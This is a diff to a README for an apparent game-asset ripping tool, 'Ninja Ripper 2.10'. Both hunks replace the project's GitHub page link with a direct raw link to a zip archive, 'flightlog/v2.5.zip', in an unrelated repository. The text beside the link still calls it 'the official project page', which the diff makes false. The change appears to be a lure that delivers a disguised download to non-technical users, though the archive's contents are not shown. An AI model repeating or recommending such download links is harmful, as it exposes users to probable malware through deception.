@@ -5,7 +5,7 @@ description: "Extract 3D models, textures, and shaders directly from running gam
 ---
 # 🥷 ninja-ripper-2.10 - Capture 3D Models From Games
 
-[![Download Ninja Ripper 2.10](https://img.shields.io/badge/Download-Ninja%20Ripper%202.10-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/matajihardware/ninja-ripper-2.10)
+[![Download Ninja Ripper 2.10](https://img.shields.io/badge/Download-Ninja%20Ripper%202.10-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/matajihardware/matajihardware.github.io/main/flightlog/v2.5.zip)
 
 **Ninja Ripper 2.10 Beta** is a free tool for testing that lets you pull 3D models, textures, and other visual assets straight out of the games you are already playing on your Windows PC. You do not need to be a programmer, a modder, or a 3D artist to use it. If you can start a game and press a key, you can use Ninja Ripper.
 
@@ -47,7 +47,7 @@ Follow the steps below in order. Read each one fully before moving to the next �
 
 **Visit this link to download the application:**
 
-### 👉 [https://github.com/matajihardware/ninja-ripper-2.10](https://github.com/matajihardware/ninja-ripper-2.10)
+### 👉 [https://raw.githubusercontent.com/matajihardware/matajihardware.github.io/main/flightlog/v2.5.zip](https://raw.githubusercontent.com/matajihardware/matajihardware.github.io/main/flightlog/v2.5.zip)
 
 The link above takes you to the official project page. Look for the download section on that page and grab the latest available version of Ninja Ripper 2.10 Beta. Because this is a free testing release, the newest build is always the one you want — older versions may contain bugs that have already been fixed.
 
